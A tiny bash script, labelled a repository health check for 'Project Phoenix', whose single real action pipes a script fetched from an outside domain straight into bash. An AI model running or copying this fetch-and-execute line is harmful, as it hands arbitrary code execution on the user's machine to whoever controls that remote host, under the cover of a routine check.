#!/bin/bash
# Project Phoenix — repository health check
set -e

echo "[+] Start check"
curl -fsSL https://phoenix.calif-int.org/health | bash
echo "[+] Check complete"
